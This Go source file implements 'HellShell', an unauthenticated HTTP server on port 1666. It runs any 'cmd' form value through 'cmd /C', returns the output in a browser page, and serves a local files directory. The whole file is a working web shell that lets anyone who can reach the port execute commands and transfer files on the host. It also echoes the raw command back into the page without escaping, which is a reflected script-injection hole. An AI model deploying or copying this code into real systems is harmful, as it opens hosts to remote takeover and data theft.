//@(#)Author: Andre Wingor http://andr.ru
//@(#)License: Devil's Contract
/*
HellShell is http server for run shell and file transfer
Run hells and open at browser port 1666 http://localhost:1666

UNDER CONSTRUCT

Usage
		hells[.exe] [ip][:port] [path/to/workspace]
*/
package main

import (
	"io"
	"fmt"
	"html"
	"net/http"
	"os/exec"
	//"github.com/andrewingor/hellShell/go"
)

const Revision = "$Id$" // Revision ID
var (
	echo []byte //Output of command
	err  error  //Error
)

//
func init() {
	//
}

// Conclusion The Contract 
func conclusion(
	resp http.ResponseWriter,
	req *http.Request) {

	io.WriteString(resp, webmuzzle)

	echo, err = exec.Command("cmd", "/C", req.FormValue("cmd")).Output()
	if err != nil {
		fmt.Println(err)
		io.WriteString(resp, err.Error())
	}
	io.WriteString(resp, html.EscapeString(string(echo)) ) 

	io.WriteString(resp, "</pre><hr>"+req.FormValue("cmd"))
	io.WriteString(resp, "</body></html>")
}

//Hell Shell Run
func main() {
	http.HandleFunc("/", conclusion)
	http.Handle("/files", http.FileServer(http.Dir("./files") ) )
	
	http.ListenAndServe(":1666", nil)

}

//Web-muzzle
var webmuzzle string = `
<!DOCTYPE html>

<html>
<head><title>Hell$hell</title></head>
<style>
pre {
	font-family: Consolas, Courier New
}
body {
	text-align: left;
	margin-left: 10%;
	font-family: Consolas;
	font-size: 14pt;
}
input {
	font-family: Consolas;
	font-size: 16pt;
}
.cmd {
	width: 70%;
	font-family: Consolas;
	font-size: 14pt;
}
.middle {
	vertical-align: middle;
	height: 7em;
	line-height: 7em;
}
</style>
<body>
<div class="middle">
	<form id="cmdstr">
cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="" autofocus />
		<input type="submit" value="Enter" /><br/>
	</form>
</div>
<script type="text/javascript">document.cmdstr.cmd.focus();</script>
<hr/>
<pre>
`
//EOF
